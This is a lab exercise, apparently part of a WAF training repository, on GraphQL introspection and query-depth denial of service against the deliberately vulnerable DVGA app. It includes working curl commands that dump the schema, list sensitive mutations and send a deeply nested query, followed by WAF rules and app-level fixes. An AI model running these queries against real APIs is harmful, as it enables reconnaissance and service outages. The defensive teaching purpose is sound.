# 04 — DVGA GraphQL Introspection + Query Depth

**Vulnerability class:** [OWASP API9:2023 — Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
(schema disclosure) plus resource exhaustion via deep nested queries.

GraphQL APIs that leave introspection enabled in production hand
attackers a complete schema dump. Combined with no query-depth limit,
this lets an attacker exfiltrate the object graph (for mapping) and
launch denial-of-service attacks with a single deeply-nested query.

## Setup

DVGA's default mode is "easy" (no auth required, introspection on) —
configured in [`base/dvga/deployment.yaml`](../../base/dvga/deployment.yaml).
Nothing to seed.

## Baseline: attack succeeds (WAF off)

### Step 1 — Introspect the full schema

```bash
HOST_IP=$(grep ^LAB_HOST_IP lab.env | cut -d= -f2)
DOMAIN=$(grep ^LAB_DOMAIN   lab.env | cut -d= -f2)

# Standard GraphQL introspection query -- all types and fields
curl -sk -X POST \
  --resolve "dvga.${DOMAIN}:443:${HOST_IP}" \
  "https://dvga.${DOMAIN}/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' \
  | python3 -m json.tool | head -40
```

**Expected (attack succeeds):** a JSON dump of every type in DVGA's
schema — `Query`, `Mutation`, `Paste`, `User`, their fields, and their
return types. You now know every object and mutation the app exposes.

### Step 2 — Mine for sensitive mutations

```bash
# Look for "admin", "password", "delete" -- attacker's shopping list
curl -sk -X POST \
  --resolve "dvga.${DOMAIN}:443:${HOST_IP}" \
  "https://dvga.${DOMAIN}/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{mutationType{fields{name description}}}}"}' \
  | python3 -c '
import sys, json
data = json.load(sys.stdin)
fields = data["data"]["__schema"]["mutationType"]["fields"]
for f in fields:
    print(f"  {f[\"name\"]:30}  {f.get(\"description\",\"\")}")'
```

Expected: a list including `deletePaste`, `importPaste`, `createUser` —
the mutations you would never want an unauthenticated attacker to know
about.

### Step 3 — Launch a query-depth DoS

```bash
# Deeply nested query -- 12 levels. DVGA has no depth limiter.
curl -sk -X POST \
  --resolve "dvga.${DOMAIN}:443:${HOST_IP}" \
  "https://dvga.${DOMAIN}/graphql" \
  -H 'Content-Type: application/json' \
  -w "\nTime: %{time_total}s\n" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}' \
  | head -20
```

**Expected:** a response time 10-100x longer than a normal query, or a
timeout. On a busy server, repeated requests like this exhaust CPU.

## Observability

**Grafana panel:** *Total Request Rate* barely moves (one request).
But look at **Connection States → `writing`** — it should climb during
the deep-query execution. Writing connections near the ceiling is the
"upstream is struggling" signal.

Check *Last Reload Duration* — unrelated to the attack, but useful to
see how NGINX behaves under load. It should stay flat.

**Log tail (`task logs:nginx`):**

```
<attacker-ip> - - [..] "POST /graphql HTTP/1.1" 200 4523 "upstream_response_time=2.341"
```

The `upstream_response_time` field is the signal. Normal GraphQL
queries complete in <50ms. Anything over 500ms on this app is either
a malformed query or an attack.

## Protected: attack blocked (`task waf-on`)

### On NGINX Plus

App Protect has built-in GraphQL support in newer versions, but the
lab's [OWASP policy](../../policies/ap-policy-owasp.yaml) doesn't
enable it by default. In a real deployment you would add:

```yaml
# Placeholder -- full config in App Protect docs
graphql-profiles:
  - name: dvga-profile
    defense-attributes:
      maximum-query-depth: 5
      maximum-batched-queries: 10
      disallow-introspection-queries: true
```

With introspection disallowed, Step 1 returns:

```
HTTP/1.1 403 Forbidden — support_id="..." violations="VIOL_GRAPHQL_INTROSPECTION"
```

With `maximum-query-depth: 5`, Step 3 returns:

```
HTTP/1.1 403 Forbidden — violations="VIOL_GRAPHQL_MAX_DEPTH"
```

### On OSS (shadow mode)

No enforcement. Attacks succeed identically to baseline.

**Application-layer mitigations on OSS (and recommended regardless of
WAF):**

1. **Disable introspection in production.** DVGA supports a "hard"
   mode — edit [`base/dvga/deployment.yaml`](../../base/dvga/deployment.yaml)
   to set `DIFFICULTY=hard` and redeploy. Introspection returns 400.
2. **Add a query-depth limiter** in the app itself (Apollo Server has
   `graphql-depth-limit`, graphene has `graphene.validation`).
3. **Set a query-complexity budget** — each field costs some points,
   a query that exceeds the budget is rejected before execution.
4. **Persisted queries** — the client can only send a pre-registered
   query ID; arbitrary queries are rejected.

## Real-world correlate

- **GitHub 2019:** their GraphQL API DoS surface was a public case
  study for why query-cost analysis is non-optional.
- **Shopify 2021:** introspection combined with unindexed fields let
  attackers enumerate product data at 1000x the rate intended.

## Further experiments

- Try `InQL` (Burp extension) — GUI-driven GraphQL attack tooling.
  The same attacks, with a visual query builder.
- Use Nuclei's GraphQL template pack: `task scan:nuclei` runs these.
  Look for the `dvga` section in the report.
- Write a legitimate-looking query that's actually quadratic in the
  backend (e.g. `{pastes{owner{pastes{owner{...}}}}}` with 50 pastes
  each owning 50 pastes each...). This is the "aliased amplification"
  variant — harder to block with depth limits alone.
